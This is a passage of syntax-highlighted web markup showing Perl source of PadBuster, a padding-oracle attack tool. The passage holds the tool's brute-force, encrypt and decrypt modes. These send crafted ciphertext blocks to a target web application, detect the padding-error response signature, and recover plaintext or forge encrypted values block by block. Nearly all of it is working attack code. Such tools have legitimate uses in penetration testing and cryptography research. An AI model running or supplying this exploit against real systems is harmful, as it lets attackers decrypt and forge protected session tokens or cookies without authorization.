<span class="kw1">my</span> <span class="re0">$forgedBytes</span><span class="sy0">;</span>
&nbsp;
<span class="co1"># Isolate the IV into a separate byte array</span>
<span class="kw1">my</span> <span class="re0">$ivBytes</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/substr.html"><span class="kw3">substr</span></a><span class="br0">(</span><span class="re0">$encryptedBytes</span><span class="sy0">,</span> <span class="nu0">0</span><span class="sy0">,</span> <span class="re0">$blockSize</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
<span class="co1"># Declare some optional elements for storing the results of the first test iteration</span>
<span class="co1"># to help the user if they don't know what the padding error looks like</span>
<span class="kw1">my</span> <span class="re0">@oracleCantidates</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">$oracleSignature</span> <span class="sy0">=</span> <span class="st0">""</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">%oracleGuesses</span><span class="sy0">;</span>
<span class="kw1">my</span> <span class="re0">%responseFileBuffer</span><span class="sy0">;</span>
&nbsp;
<span class="co1"># The block count should be the sample divided by the blocksize</span>
<span class="kw1">my</span> <span class="re0">$blockCount</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/int.html"><span class="kw3">int</span></a><span class="br0">(</span><a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/length.html"><span class="kw3">length</span></a><span class="br0">(</span><span class="re0">$encryptedBytes</span><span class="br0">)</span><span class="br0">)</span> <span class="sy0">/</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/int.html"><span class="kw3">int</span></a><span class="br0">(</span><span class="re0">$blockSize</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
<span class="kw1">if</span> <span class="br0">(</span><span class="sy0">!</span><span class="re0">$bruteForce</span> <span class="sy0">&amp;&amp;</span> <span class="sy0">!</span><span class="re0">$plainTextInput</span> <span class="sy0">&amp;&amp;</span> <span class="re0">$blockCount</span> <span class="sy0">&lt;</span> <span class="nu0">2</span><span class="br0">)</span> <span class="br0">{</span>
	<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/print.html"><span class="kw3">print</span></a> <span class="st0">"<span class="es0">\n</span>ERROR: There is only one block. Try again using the -noiv option.<span class="es0">\n</span>"</span><span class="sy0">;</span>
	<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/exit.html"><span class="kw3">exit</span></a><span class="br0">(</span><span class="br0">)</span><span class="sy0">;</span>
<span class="br0">}</span>
&nbsp;
<span class="co1"># The attack works by sending in a real cipher text block along with a fake block in front of it</span>
<span class="co1"># You only ever need to send two blocks at a time (one real one fake) and just work through</span>
<span class="co1"># the sample one block at a time</span>
&nbsp;
&nbsp;
<span class="co1"># First, re-issue the original request to let the user know if something is potentially broken</span>
<span class="kw1">my</span> <span class="br0">(</span><span class="re0">$status</span><span class="sy0">,</span> <span class="re0">$content</span><span class="sy0">,</span> <span class="re0">$location</span><span class="sy0">,</span> <span class="re0">$contentLength</span><span class="br0">)</span> <span class="sy0">=</span> <span class="re0">&amp;makeRequest</span><span class="br0">(</span><span class="re0">$method</span><span class="sy0">,</span> <span class="re0">$url</span><span class="sy0">,</span> <span class="re0">$post</span><span class="sy0">,</span> <span class="re0">$cookie</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"<span class="es0">\n</span>INFO: The original request returned the following"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] Status: $status"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>	
<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] Location: $location"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] Content Length: $contentLength<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] Response: $content<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
<span class="re0">$plainTextInput</span> <span class="sy0">=</span> <span class="re0">&amp;myDecode</span><span class="br0">(</span><span class="re0">$encodedPlainTextInput</span><span class="sy0">,</span><span class="re0">$encodingFormat</span><span class="br0">)</span> <span class="kw1">if</span> <span class="re0">$encodedPlainTextInput</span><span class="sy0">;</span>
&nbsp;
<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$bruteForce</span><span class="br0">)</span> <span class="br0">{</span>
	<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"INFO: Starting PadBuster Brute Force Mode"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
	<span class="kw1">my</span> <span class="re0">$bfAttempts</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
&nbsp;
	<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/print.html"><span class="kw3">print</span></a> <span class="st0">"INFO: Resuming previous brute force at attempt $resumeBlock<span class="es0">\n</span>"</span> <span class="kw1">if</span> <span class="re0">$resumeBlock</span><span class="sy0">;</span>
&nbsp;
	<span class="co1"># Only loop through the first 3 bytes...this should be enough as it </span>
	<span class="co1"># requires 16.5M+ requests</span>
&nbsp;
	<span class="kw1">my</span> <span class="re0">@bfSamples</span><span class="sy0">;</span>
	<span class="kw1">my</span> <span class="re0">$sampleString</span> <span class="sy0">=</span> <span class="st0">"<span class="es0">\x</span>00"</span> x <span class="nu0">2</span><span class="sy0">;</span>
	<span class="kw1">for</span> <span class="kw1">my</span> <span class="re0">$c</span> <span class="br0">(</span><span class="nu0">0</span> <span class="sy0">...</span> <span class="nu0">255</span><span class="br0">)</span> <span class="br0">{</span>
	 <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/substr.html"><span class="kw3">substr</span></a><span class="br0">(</span><span class="re0">$sampleString</span><span class="sy0">,</span> <span class="nu0">0</span><span class="sy0">,</span> <span class="nu0">1</span><span class="sy0">,</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/chr.html"><span class="kw3">chr</span></a><span class="br0">(</span><span class="re0">$c</span><span class="br0">)</span><span class="br0">)</span><span class="sy0">;</span>
	 <span class="kw1">for</span> <span class="kw1">my</span> <span class="re0">$d</span> <span class="br0">(</span><span class="nu0">0</span> <span class="sy0">...</span> <span class="nu0">255</span><span class="br0">)</span> <span class="br0">{</span>
	  <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/substr.html"><span class="kw3">substr</span></a><span class="br0">(</span><span class="re0">$sampleString</span><span class="sy0">,</span> <span class="nu0">1</span><span class="sy0">,</span> <span class="nu0">1</span><span class="sy0">,</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/chr.html"><span class="kw3">chr</span></a><span class="br0">(</span><span class="re0">$d</span><span class="br0">)</span><span class="br0">)</span><span class="sy0">;</span>
	  <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/push.html"><span class="kw3">push</span></a> <span class="br0">(</span><span class="re0">@bfSamples</span><span class="sy0">,</span> <span class="re0">$sampleString</span><span class="br0">)</span><span class="sy0">;</span>
	 <span class="br0">}</span>
	<span class="br0">}</span>
&nbsp;
	<span class="kw1">foreach</span> <span class="kw1">my</span> <span class="re0">$testVal</span> <span class="br0">(</span><span class="re0">@bfSamples</span><span class="br0">)</span> <span class="br0">{</span>
	 <span class="kw1">my</span> <span class="re0">$complete</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
	 <span class="kw1">while</span> <span class="br0">(</span><span class="re0">$complete</span> <span class="sy0">==</span> <span class="nu0">0</span><span class="br0">)</span> <span class="br0">{</span>
	  <span class="kw1">my</span> <span class="re0">$repeat</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
	  <span class="kw1">for</span> <span class="kw1">my</span> <span class="re0">$b</span> <span class="br0">(</span><span class="nu0">0</span> <span class="sy0">...</span> <span class="nu0">255</span><span class="br0">)</span> <span class="br0">{</span>
  	   <span class="re0">$bfAttempts</span><span class="sy0">++;</span>  	   
  	   <span class="kw1">if</span> <span class="br0">(</span> <span class="re0">$resumeBlock</span> <span class="sy0">&amp;&amp;</span> <span class="br0">(</span><span class="re0">$bfAttempts</span> <span class="sy0">&lt;</span> <span class="br0">(</span><span class="re0">$resumeBlock</span> <span class="sy0">-</span> <span class="br0">(</span><span class="re0">$resumeBlock</span> <span class="sy0">%</span> <span class="nu0">256</span><span class="br0">)</span><span class="sy0">+</span><span class="nu0">1</span><span class="br0">)</span><span class="br0">)</span> <span class="br0">)</span> <span class="br0">{</span>
		   <span class="co1">#SKIP</span>
	   <span class="br0">}</span> <span class="kw1">else</span> <span class="br0">{</span>
		   <span class="kw1">my</span> <span class="re0">$testBytes</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/chr.html"><span class="kw3">chr</span></a><span class="br0">(</span><span class="re0">$b</span><span class="br0">)</span><span class="sy0">.</span><span class="re0">$testVal</span><span class="sy0">;</span>
		   <span class="re0">$testBytes</span> <span class="sy0">.=</span> <span class="st0">"<span class="es0">\x</span>00"</span> x <span class="br0">(</span><span class="re0">$blockSize</span><span class="sy0">-</span><span class="nu0">3</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
		   <span class="kw1">my</span> <span class="re0">$combinedBf</span> <span class="sy0">=</span> <span class="re0">$testBytes</span><span class="sy0">;</span>  
		   <span class="re0">$combinedBf</span> <span class="sy0">.=</span> <span class="re0">$encryptedBytes</span><span class="sy0">;</span>
		   <span class="re0">$combinedBf</span> <span class="sy0">=</span> <span class="re0">&amp;myEncode</span><span class="br0">(</span><span class="re0">$combinedBf</span><span class="sy0">,</span> <span class="re0">$encoding</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
		   <span class="co1"># Add the Query String to the URL</span>
		   <span class="kw1">my</span> <span class="br0">(</span><span class="re0">$testUrl</span><span class="sy0">,</span> <span class="re0">$testPost</span><span class="sy0">,</span> <span class="re0">$testCookies</span><span class="br0">)</span> <span class="sy0">=</span> <span class="re0">&amp;prepRequest</span><span class="br0">(</span><span class="re0">$url</span><span class="sy0">,</span> <span class="re0">$post</span><span class="sy0">,</span> <span class="re0">$cookie</span><span class="sy0">,</span> <span class="re0">$sample</span><span class="sy0">,</span> <span class="re0">$combinedBf</span><span class="br0">)</span><span class="sy0">;</span>  	  
&nbsp;
&nbsp;
		   <span class="co1"># Issue the request</span>
		   <span class="kw1">my</span> <span class="br0">(</span><span class="re0">$status</span><span class="sy0">,</span> <span class="re0">$content</span><span class="sy0">,</span> <span class="re0">$location</span><span class="sy0">,</span> <span class="re0">$contentLength</span><span class="br0">)</span> <span class="sy0">=</span> <span class="re0">&amp;makeRequest</span><span class="br0">(</span><span class="re0">$method</span><span class="sy0">,</span> <span class="re0">$testUrl</span><span class="sy0">,</span> <span class="re0">$testPost</span><span class="sy0">,</span> <span class="re0">$testCookies</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
		   <span class="kw1">my</span> <span class="re0">$signatureData</span> <span class="sy0">=</span> <span class="st0">"$status<span class="es0">\t</span>$contentLength<span class="es0">\t</span>$location"</span><span class="sy0">;</span>
		   <span class="re0">$signatureData</span> <span class="sy0">=</span> <span class="st0">"$status<span class="es0">\t</span>$contentLength<span class="es0">\t</span>$location<span class="es0">\t</span>$content"</span> <span class="kw1">if</span> <span class="re0">$useBody</span><span class="sy0">;</span>
&nbsp;
		   <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$oracleSignature</span> <span class="kw1">eq</span> <span class="st0">""</span><span class="br0">)</span> <span class="br0">{</span>
			<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] Starting response analysis...<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span> <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$b</span> <span class="sy0">==</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
			<span class="re0">$oracleGuesses</span><span class="br0">{</span><span class="re0">$signatureData</span><span class="br0">}</span><span class="sy0">++;</span>
			<span class="re0">$responseFileBuffer</span><span class="br0">{</span><span class="re0">$signatureData</span><span class="br0">}</span> <span class="sy0">=</span> <span class="st0">"Status: $status<span class="es0">\n</span>Location: $location<span class="es0">\n</span>Content-Length: $contentLength<span class="es0">\n</span>Content:<span class="es0">\n</span>$content"</span><span class="sy0">;</span>
			<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$b</span> <span class="sy0">==</span> <span class="nu0">255</span><span class="br0">)</span> <span class="br0">{</span>
				<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"*** Response Analysis Complete ***<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
				<span class="re0">&amp;determineSignature</span><span class="br0">(</span><span class="br0">)</span><span class="sy0">;</span>
				<span class="re0">$printStats</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">;</span>
				<span class="re0">$timeTracker</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
				<span class="re0">$requestTracker</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
				<span class="re0">$repeat</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="sy0">;</span>
				<span class="re0">$bfAttempts</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="sy0">;</span>
			<span class="br0">}</span>
		   <span class="br0">}</span>
		   <span class="kw1">if</span> <span class="br0">(</span><span class="re0">$oracleSignature</span> <span class="kw1">ne</span> <span class="st0">""</span> <span class="sy0">&amp;&amp;</span> <span class="re0">$oracleSignature</span> <span class="kw1">ne</span> <span class="re0">$signatureData</span><span class="br0">)</span> <span class="br0">{</span>
			<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"<span class="es0">\n</span>Attempt $bfAttempts - Status: $status - Content Length: $contentLength<span class="es0">\n</span>$testUrl<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
			<span class="re0">&amp;writeFile</span><span class="br0">(</span><span class="st0">"Brute_Force_Attempt_"</span><span class="sy0">.</span><span class="re0">$bfAttempts</span><span class="sy0">.</span><span class="st0">".txt"</span><span class="sy0">,</span> <span class="st0">"URL: $testUrl<span class="es0">\n</span>Post Data: $testPost<span class="es0">\n</span>Cookies: $testCookies<span class="es0">\n</span><span class="es0">\n</span>Status: $status<span class="es0">\n</span>Location: $location<span class="es0">\n</span>Content-Length: $contentLength<span class="es0">\n</span>Content:<span class="es0">\n</span>$content"</span><span class="br0">)</span><span class="sy0">;</span>
		   <span class="br0">}</span>
	   <span class="br0">}</span>
	  <span class="br0">}</span>
	  <span class="br0">(</span><span class="re0">$repeat</span> <span class="sy0">==</span> <span class="nu0">1</span><span class="br0">)</span> <span class="sy0">?</span> <span class="br0">(</span><span class="re0">$complete</span> <span class="sy0">=</span> <span class="nu0">0</span><span class="br0">)</span> <span class="sy0">:</span> <span class="br0">(</span><span class="re0">$complete</span> <span class="sy0">=</span> <span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span>
	 <span class="br0">}</span> 
	<span class="br0">}</span>  
<span class="br0">}</span> <span class="kw1">elsif</span> <span class="br0">(</span><span class="re0">$plainTextInput</span><span class="br0">)</span> <span class="br0">{</span>
	<span class="co1"># ENCRYPT MODE</span>
	<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"INFO: Starting PadBuster Encrypt Mode"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
	<span class="co1"># The block count will be the plaintext divided by blocksize (rounded up)	</span>
	<span class="kw1">my</span> <span class="re0">$blockCount</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/int.html"><span class="kw3">int</span></a><span class="br0">(</span><span class="br0">(</span><span class="br0">(</span><a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/length.html"><span class="kw3">length</span></a><span class="br0">(</span><span class="re0">$plainTextInput</span><span class="br0">)</span><span class="sy0">+</span><span class="nu0">1</span><span class="br0">)</span><span class="sy0">/</span><span class="re0">$blockSize</span><span class="br0">)</span><span class="sy0">+</span><span class="nu0">0.99</span><span class="br0">)</span><span class="sy0">;</span>
	<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] Number of Blocks: "</span><span class="sy0">.</span><span class="re0">$blockCount</span><span class="sy0">.</span><span class="st0">"<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
	<span class="kw1">my</span> <span class="re0">$padCount</span> <span class="sy0">=</span> <span class="br0">(</span><span class="re0">$blockSize</span> <span class="sy0">*</span> <span class="re0">$blockCount</span><span class="br0">)</span> <span class="sy0">-</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/length.html"><span class="kw3">length</span></a><span class="br0">(</span><span class="re0">$plainTextInput</span><span class="br0">)</span><span class="sy0">;</span>	
	<span class="re0">$plainTextInput</span><span class="sy0">.=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/chr.html"><span class="kw3">chr</span></a><span class="br0">(</span><span class="re0">$padCount</span><span class="br0">)</span> x <span class="re0">$padCount</span><span class="sy0">;</span>
&nbsp;
	<span class="co1"># SampleBytes is the encrypted text you want to derive intermediate values for, so </span>
	<span class="co1"># copy the current ciphertext block into sampleBytes</span>
	<span class="co1"># Note, nulls are used if not provided and the intermediate values are brute forced</span>
&nbsp;
	<span class="re0">$forgedBytes</span> <span class="sy0">=</span> <span class="re0">$cipherInput</span> <span class="sy0">?</span> <span class="re0">&amp;myDecode</span><span class="br0">(</span><span class="re0">$cipherInput</span><span class="sy0">,</span><span class="nu0">1</span><span class="br0">)</span> <span class="sy0">:</span> <span class="st0">"<span class="es0">\x</span>00"</span> x <span class="re0">$blockSize</span><span class="sy0">;</span>
	<span class="kw1">my</span> <span class="re0">$sampleBytes</span> <span class="sy0">=</span> <span class="re0">$forgedBytes</span><span class="sy0">;</span>
&nbsp;
	<span class="kw1">for</span> <span class="br0">(</span><span class="kw1">my</span> <span class="re0">$blockNum</span> <span class="sy0">=</span> <span class="re0">$blockCount</span><span class="sy0">;</span> <span class="re0">$blockNum</span> <span class="sy0">&gt;</span> <span class="nu0">0</span><span class="sy0">;</span> <span class="re0">$blockNum</span><span class="sy0">--</span><span class="br0">)</span> <span class="br0">{</span> 	
		<span class="co1"># IntermediaryBytes is where the intermediate bytes produced by the algorithm are stored</span>
		<span class="kw1">my</span> <span class="re0">$intermediaryBytes</span><span class="sy0">;</span>
&nbsp;
		<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$intermediaryInput</span> <span class="sy0">&amp;&amp;</span> <span class="re0">$blockNum</span> <span class="sy0">==</span> <span class="re0">$blockCount</span><span class="br0">)</span> <span class="br0">{</span>
			<span class="re0">$intermediaryBytes</span> <span class="sy0">=</span> <span class="re0">&amp;myDecode</span><span class="br0">(</span><span class="re0">$intermediaryInput</span><span class="sy0">,</span><span class="nu0">2</span><span class="br0">)</span><span class="sy0">;</span>
		<span class="br0">}</span> <span class="kw1">else</span> <span class="br0">{</span>
			<span class="re0">$intermediaryBytes</span> <span class="sy0">=</span> <span class="re0">&amp;processBlock</span><span class="br0">(</span><span class="re0">$sampleBytes</span><span class="br0">)</span><span class="sy0">;</span>
		<span class="br0">}</span>
&nbsp;
	        <span class="co1"># Now XOR the intermediate bytes with the corresponding bytes from the plain-text block</span>
	        <span class="co1"># This will become the next ciphertext block (or IV if the last one)</span>
	        <span class="re0">$sampleBytes</span> <span class="sy0">=</span> <span class="re0">$intermediaryBytes</span> <span class="sy0">^</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/substr.html"><span class="kw3">substr</span></a><span class="br0">(</span><span class="re0">$plainTextInput</span><span class="sy0">,</span> <span class="br0">(</span><span class="br0">(</span><span class="re0">$blockNum</span><span class="sy0">-</span><span class="nu0">1</span><span class="br0">)</span> <span class="sy0">*</span> <span class="re0">$blockSize</span><span class="br0">)</span><span class="sy0">,</span> <span class="re0">$blockSize</span><span class="br0">)</span><span class="sy0">;</span>
		<span class="re0">$forgedBytes</span> <span class="sy0">=</span> <span class="re0">$sampleBytes</span><span class="sy0">.</span><span class="re0">$forgedBytes</span><span class="sy0">;</span>
&nbsp;
		<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"<span class="es0">\n</span>Block "</span><span class="sy0">.</span><span class="br0">(</span><span class="re0">$blockNum</span><span class="br0">)</span><span class="sy0">.</span><span class="st0">" Results:"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
		<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] New Cipher Text (HEX): "</span><span class="sy0">.</span><span class="re0">&amp;myEncode</span><span class="br0">(</span><span class="re0">$sampleBytes</span><span class="sy0">,</span><span class="nu0">1</span><span class="br0">)</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
		<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] Intermediate Bytes (HEX): "</span><span class="sy0">.</span><span class="re0">&amp;myEncode</span><span class="br0">(</span><span class="re0">$intermediaryBytes</span><span class="sy0">,</span><span class="nu0">1</span><span class="br0">)</span><span class="sy0">.</span><span class="st0">"<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
	<span class="br0">}</span>
	<span class="re0">$forgedBytes</span> <span class="sy0">=</span> <span class="re0">&amp;myEncode</span><span class="br0">(</span><span class="re0">$forgedBytes</span><span class="sy0">,</span> <span class="re0">$encoding</span><span class="br0">)</span><span class="sy0">;</span>
	<a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/chomp.html"><span class="kw3">chomp</span></a><span class="br0">(</span><span class="re0">$forgedBytes</span><span class="br0">)</span><span class="sy0">;</span>
<span class="br0">}</span> <span class="kw1">else</span> <span class="br0">{</span>
	<span class="co1"># DECRYPT MODE</span>
	<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"INFO: Starting PadBuster Decrypt Mode"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
	<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$resumeBlock</span><span class="br0">)</span> <span class="br0">{</span>
		<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"INFO: Resuming previous exploit at Block $resumeBlock<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
	<span class="br0">}</span> <span class="kw1">else</span> <span class="br0">{</span>
		<span class="re0">$resumeBlock</span> <span class="sy0">=</span> <span class="nu0">1</span>
	<span class="br0">}</span>
&nbsp;
	<span class="co1"># Assume that the IV is included in our sample and that the first block is the IV	</span>
	<span class="kw1">for</span> <span class="br0">(</span><span class="kw1">my</span> <span class="re0">$blockNum</span> <span class="sy0">=</span> <span class="br0">(</span><span class="re0">$resumeBlock</span><span class="sy0">+</span><span class="nu0">1</span><span class="br0">)</span><span class="sy0">;</span> <span class="re0">$blockNum</span> <span class="sy0">&lt;=</span> <span class="re0">$blockCount</span><span class="sy0">;</span> <span class="re0">$blockNum</span><span class="sy0">++</span><span class="br0">)</span> <span class="br0">{</span> 
		<span class="co1"># Since the IV is the first block, our block count is artificially inflated by one</span>
		<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"*** Starting Block "</span><span class="sy0">.</span><span class="br0">(</span><span class="re0">$blockNum</span><span class="sy0">-</span><span class="nu0">1</span><span class="br0">)</span><span class="sy0">.</span><span class="st0">" of "</span><span class="sy0">.</span><span class="br0">(</span><span class="re0">$blockCount</span><span class="sy0">-</span><span class="nu0">1</span><span class="br0">)</span><span class="sy0">.</span><span class="st0">" ***<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
		<span class="co1"># SampleBytes is the encrypted text you want to break, so </span>
		<span class="co1"># lets copy the current ciphertext block into sampleBytes</span>
		<span class="kw1">my</span> <span class="re0">$sampleBytes</span> <span class="sy0">=</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/substr.html"><span class="kw3">substr</span></a><span class="br0">(</span><span class="re0">$encryptedBytes</span><span class="sy0">,</span> <span class="br0">(</span><span class="re0">$blockNum</span> <span class="sy0">*</span> <span class="re0">$blockSize</span> <span class="sy0">-</span> <span class="re0">$blockSize</span><span class="br0">)</span><span class="sy0">,</span> <span class="re0">$blockSize</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
		<span class="co1"># IntermediaryBytes is where the the intermediary bytes produced by the algorithm are stored</span>
		<span class="kw1">my</span> <span class="re0">$intermediaryBytes</span> <span class="sy0">=</span> <span class="re0">&amp;processBlock</span><span class="br0">(</span><span class="re0">$sampleBytes</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
		<span class="co1"># DecryptedBytes is where the decrypted block is stored</span>
		<span class="kw1">my</span> <span class="re0">$decryptedBytes</span><span class="sy0">;</span>			        	
&nbsp;
		<span class="co1"># Now we XOR the decrypted byte with the corresponding byte from the previous block</span>
		<span class="co1"># (or IV if we are in the first block) to get the actual plain-text</span>
		<span class="re0">$blockNum</span> <span class="sy0">==</span> <span class="nu0">2</span> <span class="sy0">?</span> <span class="re0">$decryptedBytes</span> <span class="sy0">=</span> <span class="re0">$intermediaryBytes</span> <span class="sy0">^</span> <span class="re0">$ivBytes</span> <span class="sy0">:</span> <span class="re0">$decryptedBytes</span> <span class="sy0">=</span> <span class="re0">$intermediaryBytes</span> <span class="sy0">^</span> <a href="https://web.archive.org/web/20160629065624/http://perldoc.perl.org/functions/substr.html"><span class="kw3">substr</span></a><span class="br0">(</span><span class="re0">$encryptedBytes</span><span class="sy0">,</span> <span class="br0">(</span><span class="br0">(</span><span class="re0">$blockNum</span> <span class="sy0">-</span> <span class="nu0">2</span><span class="br0">)</span> <span class="sy0">*</span> <span class="re0">$blockSize</span><span class="br0">)</span><span class="sy0">,</span> <span class="re0">$blockSize</span><span class="br0">)</span><span class="sy0">;</span>
&nbsp;
		<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"<span class="es0">\n</span>Block "</span><span class="sy0">.</span><span class="br0">(</span><span class="re0">$blockNum</span><span class="sy0">-</span><span class="nu0">1</span><span class="br0">)</span><span class="sy0">.</span><span class="st0">" Results:"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
		<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] Cipher Text (HEX): "</span><span class="sy0">.</span><span class="re0">&amp;myEncode</span><span class="br0">(</span><span class="re0">$sampleBytes</span><span class="sy0">,</span><span class="nu0">1</span><span class="br0">)</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
		<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] Intermediate Bytes (HEX): "</span><span class="sy0">.</span><span class="re0">&amp;myEncode</span><span class="br0">(</span><span class="re0">$intermediaryBytes</span><span class="sy0">,</span><span class="nu0">1</span><span class="br0">)</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
		<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] Plain Text: $decryptedBytes<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
		<span class="re0">$plainTextBytes</span> <span class="sy0">=</span> <span class="re0">$plainTextBytes</span><span class="sy0">.</span><span class="re0">$decryptedBytes</span><span class="sy0">;</span>
	<span class="br0">}</span>
<span class="br0">}</span>
&nbsp;
<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"-------------------------------------------------------"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>	
<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"** Finished ***<span class="es0">\n</span>"</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
<span class="kw1">if</span> <span class="br0">(</span><span class="re0">$plainTextInput</span><span class="br0">)</span> <span class="br0">{</span>
	<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] Encrypted value is: "</span><span class="sy0">.</span><span class="re0">&amp;uri_escape</span><span class="br0">(</span><span class="re0">$forgedBytes</span><span class="br0">)</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
<span class="br0">}</span> <span class="kw1">else</span> <span class="br0">{</span>	
	<span class="re0">&amp;myPrint</span><span class="br0">(</span><span class="st0">"[+] Decrypted value (ASCII): $plainTextBytes<span class="es0">\n</span>"</span><span class="sy0">,</span><span class="nu0">0</span><span class="br0">)</span><span class="sy0">;</span>
